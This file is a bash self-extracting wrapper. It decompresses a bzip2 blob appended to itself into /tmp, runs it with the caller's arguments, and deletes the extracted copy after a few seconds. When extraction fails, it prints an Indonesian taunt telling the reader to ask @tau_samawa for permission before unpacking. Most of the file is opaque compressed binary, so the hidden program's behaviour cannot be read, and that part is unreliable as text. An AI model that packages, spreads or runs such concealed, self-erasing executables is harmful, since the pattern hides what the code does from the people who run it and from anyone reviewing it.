#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYb�x.  �_�qs�����������PD@  P��&k���WIƝ�I	�� h
yO@ɒOɥzh�����b=���i<��$����M2����@4 � h 4 	6��<��Ph2 24���  ���4 4� 4i��&@ 	"��F����3(z�)�4 @   P=�D�?wO�N�ۣ��|�x�Cz[��<+�[��-2:����f�/	.�S��� ��?��u�j9-��_�j�O�w:KU��K�8�q�Ĳ�2�����mh0�(n�����>� =�j��\m�+`[M���T��NV�t��>E��Zn�Z2�b��K)�b1�ɷ{ǯj��-D����5{7 ?��D�U��F��ܢ{��=�1j��s=%2���������թ�=�*�;�6�c��-Ѡ�d3mh�%5&l� �2�����#+��p�8|Ј�"�.~?�\��f�����
�kR T䚜7��IzY��� ����ٗ��i�r�x|@��@^��@�0�f\�{�ͪF��;��sn��f���&bsE��V�4A�Ƭ-}]:�I�-� ��vw���E�(RHUE+o]L�̥���(�d@}�d)�7�T@�Z�1�n6I�"���kx���-��Mn*������I���b��z8�::q�t,�o:����O�����Z�)C�emϭ�n�~mjr}���g��`Z��$�.�|)6Q���-��aO���� �����ԙ���@_~z�X͙ٴ��3��۳5���J��뫧*p�qȦi(��/q���p5NQ��t�9U@��!E���K�^����׬�˲¦0V�at��QRVdpnBM�F�"��!��V��,��ǃ��(�0��\�(�����mxf\��U,�*��L���R��fu��7Y&9��o�s�}����^��Y�`��{�P���g	��f�˰d-ePU�|�E���F��U��&��:�ҩ�9���A�!`�wpj����A����e06q�^��A;Q��"�����*��;g�fiI��Zq±Gn�������3�1&3��� ��²�RT\m oY5�	l�s��U?8��2�r�7��� X�%B	��]~Քyo���$Y�3a![33^�G�sLzC�OK��V��8��*�K�,'��T��u�;4�9�!8�(��7P	�T!�f{i.!ӹ�!<4$�f�{h�r@ȁ�S���WI'�9��R���k�e��)�^�ھbO<Yć�A9��l&�9cZ3��S��#D��6��F\(���`2�l���W�A)���r�UD�*NPQ��BB���K���du:]��`˽�����&�1^�80��A�Rĉ���%+���U&�ı��!=4e���8P���]9s��r2�A�,�ELnm7�x�$*�l�2He2+��<!�u�ˍ![���(*үZy��VEތ�K)=�@ȅ���������9t��;��!1!	��so��0 V�1����"�(H1s< 